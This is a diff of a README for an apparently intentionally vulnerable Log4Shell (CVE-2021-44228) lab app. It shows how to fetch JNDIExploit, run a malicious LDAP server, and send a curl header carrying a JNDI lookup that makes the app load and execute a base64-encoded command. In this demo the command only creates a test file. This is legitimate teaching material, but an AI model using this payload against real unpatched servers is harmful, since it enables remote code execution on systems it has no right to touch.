@@ -10,6 +10,8 @@ Application developed in Java that simulates an application vulnerable to CVE-20
 
 It uses Log4j 2.11.1 and JDK 1.8.0_181.
 
+![TekiumLog4jApp](https://github.com/erickrr-bd/TekiumLog4jApp/blob/master/screens/screen.jpg)
+
 # Running
 
 Run it:
@@ -26,6 +28,8 @@ Build the Docker image by yourself:
 
 <i>Note: This project is inspired by the <a href="https://github.com/christophetd/log4shell-vulnerable-app">christophetd</a> project.</i>
 
+JNDIExploit.v1.2.zip is included in the repository as it was apparently removed from Github.
+
 - Use <a href="https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip">JNDIExploit</a> to spin up a malicious LDAP server
 
 `wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip`
@@ -36,13 +40,13 @@ Build the Docker image by yourself:
 
 - Then, trigger the exploit using:
 
-`curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC90ZWtpdW1fcHJ1ZWJh}'`
+`curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC90ZWtpdW1fcHJ1ZWJhLnR4dA==}'`
 
 - Notice the output of JNDIExploit, showing it has sent a malicious LDAP response and served the second-stage payload:
 
+![TekiumLog4jApp](https://github.com/erickrr-bd/TekiumLog4jApp/blob/master/screens/response.jpg)
 
-
-- To confirm that the code execution was successful, notice that the file /tmp/tekium_prueba was created in the container running the vulnerable application:
+- To confirm that the code execution was successful, notice that the file /tmp/tekium_prueba.txt was created in the container running the vulnerable application:
 
 `docker exec tekiumlog4japp ls /tmp`
 
